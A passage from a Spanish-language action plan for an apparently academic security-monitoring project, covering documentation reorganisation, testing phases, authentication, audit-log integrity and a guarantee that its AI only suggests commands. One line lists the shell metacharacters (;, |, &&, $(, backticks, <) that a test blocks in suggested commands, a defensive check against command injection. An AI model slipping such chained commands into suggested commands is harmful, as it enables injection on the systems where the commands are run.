| **Validación de comandos** | Todo `comando_sugerido` debe matchear un patrón del catálogo de playbooks; un test verifica que ninguno contenga `;`, `|`, `&&`, `$(`, backticks o `<` (§2.2) |
| **Documento** | `docs/11-garantia-de-no-autonomia.md`: la propiedad, la evidencia, los controles que la sostienen, y qué haría falta para romperla. Es el documento que se muestra cuando alguien pregunta "¿y si la IA se equivoca?" |
| **Aviso en la UI** | Banner permanente: *"Las acciones son sugerencias. El sistema no ejecuta nada. Verificá todo comando antes de correrlo."* Con S-01 corregido sigue siendo la advertencia correcta |
| **`CONTRIBUTING.md`** | Regla explícita: agregar ejecución de comandos requiere cambiar este documento y el test de arquitectura — o sea, es una decisión consciente, no un descuido |

---

## 7. Pilar 6 — Documentación centralizada en `/docs`

### 7.1 Regla

> **Toda la documentación del proyecto vive en `/docs`.** Fuera de `/docs` solo
> puede haber: `README.md` (portada, que enlaza a `/docs`), `CLAUDE.md`
> (orientación para el asistente) y `CONTRIBUTING.md`. Ningún `.md` técnico
> suelto en la raíz ni en subcarpetas de código.

### 7.2 Reubicaciones necesarias

| Hoy | Va a | Por qué |
|-----|------|---------|
| `DEPLOYMENT.md` (raíz) | `docs/03-instalacion-y-montaje.md` (fusionar) | Manual de despliegue: por definición va en `/docs`, y hoy duplica contenido |
| `brute_force.md` (raíz) | `docs/05-simulaciones-de-ataque.md` (fusionar) | Mismo tema, dos lugares |
| `rules/rules.md` | `docs/07-reglas-de-deteccion.md` como anexo, o `docs/rules/` | El catálogo de 13 reglas es documentación |
| `.claude/claude-context/outputs/auditoria-*.md` | `docs/audit/` | Es un entregable de auditoría, no contexto de herramienta |
| `Grupo4-ERS.docx`, `*.pdf` | `docs/ers/` | Documentos formales del proyecto |

`README.md` queda como portada corta que apunta a `docs/README.md`.

### 7.3 Documentos a crear

| Documento | Contenido | Pilar |
|-----------|-----------|-------|
| `docs/10-plan-de-accion.md` | **Este documento** | todos |
| `docs/11-garantia-de-no-autonomia.md` | La certificación de §6 con su evidencia y controles | 5 |
| `docs/12-registro-de-pruebas.md` | **Creado en la Fase 1.** Registro vivo de toda verificación ejecutada: SAST y pruebas de servicio, con resultados reales | 2, 3 |
| `docs/17-guia-de-estilo.md` | Convenciones Python/JS, naming, docstrings en español, límites de complejidad, configuración de SAST (corrido de 12 a 17: el 12 lo ocupa el registro de pruebas) | 2 |
| `docs/13-logica-deterministica.md` | **Justificación de cada umbral**: por qué 20 fallos, por qué 5000 = crítica, por qué 10 puertos. Hoy son constantes sin fundamento escrito, y es lo primero que va a preguntar un evaluador | 1 |
| `docs/14-pruebas.md` | Estrategia de testing, cómo correr la suite, qué cubre el 80 % y qué no | 3 |
| `docs/15-autenticacion-y-roles.md` | Modelo de auth, tabla de roles, gestión de usuarios, decisiones de sesión | 4 |
| `docs/16-api-rest.md` | Contrato completo de `/api/v1/` con ejemplos de request/response y códigos de error | 1 |

### 7.4 Mantenimiento

- Actualizar el índice de `docs/README.md` es parte del "definition of done" de
  cualquier cambio que agregue un documento.
- Chequeo en CI: enlaces internos rotos (`lychee` o un script de 20 líneas), y
  que no exista ningún `.md` fuera de `/docs` salvo los tres permitidos.
- Cada documento arranca con **fecha y alcance**, como este.

---

## 8. Secuencia de ejecución

Ordenada por dependencia y por riesgo, no por pilar.

### Fase 0 — Red de seguridad (antes de tocar lógica)

Sin tests, cualquier refactor de la §2 es a ciegas.

1. `requirements-dev.txt`, `pytest`, `conftest.py`, fixtures desde la captura real.
2. **Tests de caracterización**: congelar el comportamiento actual, bugs incluidos.
3. SAST corriendo (§3.2) y CI en verde con el baseline.
4. `tests/test_no_autonomy.py` (§6.3) — la propiedad más importante, protegida primero.

**Sale con:** cualquier cambio de la Fase 1 que rompa algo, se nota.

### Fase 1 — Correcciones P0

5. **S-01** validadores + omitir acciones no resolubles (§2.2).
6. **S-02** `esc()` completo + delegación de eventos (parcial de R-05).
7. **L-01 / L-02** contador e identidad del incidente (§2.1).
8. **A-01** sacar la auditoría de `reset.sh`.
9. **API-01** — se resuelve en la Fase 3; hasta entonces, el dashboard **solo** en
   `127.0.0.1` (ya lo está) y documentado como "no exponer".

Los tests de caracterización de la Fase 0 se actualizan acá: cada cambio de
comportamiento esperado queda explícito en un diff de test, que es exactamente la
trazabilidad que se quiere.

### Fase 2 — Refactorización y robustez

10. R-01 (+ B-01, B-02), R-02, R-03, R-04.
11. L-03, L-04, B-03, B-04, B-05.
12. A-02 (locking), A-04 (cadena de hash), A-03 (`action_id` estables).
13. API-02, API-03, API-04, API-05 + `/healthz`.
14. Subir cobertura a ≥ 80 % sobre el alcance de §4.1.

### Fase 3 — v1.0 (login + MVP)

15. §5.5 completo (auth → roles → sesión en la auditoría).
16. R-05: partir `index.html`; ESLint entra en CI.
17. Triage y decisión como rutas separadas; modal de nota.
18. Playwright E2E, incluido el test anti-XSS.

### Fase 4 — Documentación y cierre

19. Reubicaciones de §7.2.
20. Los 7 documentos de §7.3 (`13-logica-deterministica.md` primero: es el que
    sostiene todas las decisiones del clasificador).
21. Verificación completa: SAST limpio, cobertura ≥ 80 %, suite < 5 min, demo
    end-to-end offline.

### Criterios de aceptación de la v1.0

- [ ] `pytest` verde, cobertura ≥ 80 % en `classifier`/`siem_lib`/`dashboard`
- [ ] Suite completa (SAST + unit + integ + e2e) en **< 5 minutos**
- [ ] bandit y `pylint-secure-coding-standard` sin hallazgos HIGH/MEDIUM
- [ ] ESLint con `security` y `no-unsanitized` sin errores
- [ ] `test_no_autonomy.py` pasa; `docs/11-garantia-de-no-autonomia.md` publicado
- [ ] Ningún endpoint accesible sin sesión; `analyst` sale de la sesión
- [ ] Cadena de hash de `decisions.jsonl` verificable y verificada en CI
- [ ] Ningún `comando_sugerido` contiene metacaracteres de shell ni placeholders
- [ ] Demo offline completa: simulación → pipeline → login → triage → decisión → auditoría
- [ ] Toda la documentación en `/docs`, índice actualizado, sin enlaces rotos

---

## 9. Riesgos

| Riesgo | Mitigación |
|--------|-----------|
| El refactor de identidad (§2.1) cambia todos los `incident_id` y huérfana las decisiones históricas | Hacerlo en la Fase 1 con el `decisions.jsonl` actual archivado en `audit/archive/`; documentar el corte |
| Los tests E2E se vuelven inestables y nadie los corre | Un solo flujo, datos fijos, sin esperas por tiempo (solo por selector), `--retries=1` |
| El 80 % se persigue con tests triviales | La lista de §4.3 es de casos **de comportamiento**; la cobertura es consecuencia, no objetivo |
| El login se expande a SSO/MFA y se come el MVP | El alcance de §5.1 está cerrado por escrito; lo demás es v1.1 |
| Gemini vuelve a tener cuota y aparecen comportamientos no vistos | El fallback sigue siendo el camino por defecto; agregar un test que corra ambos modos con un cliente mockeado |
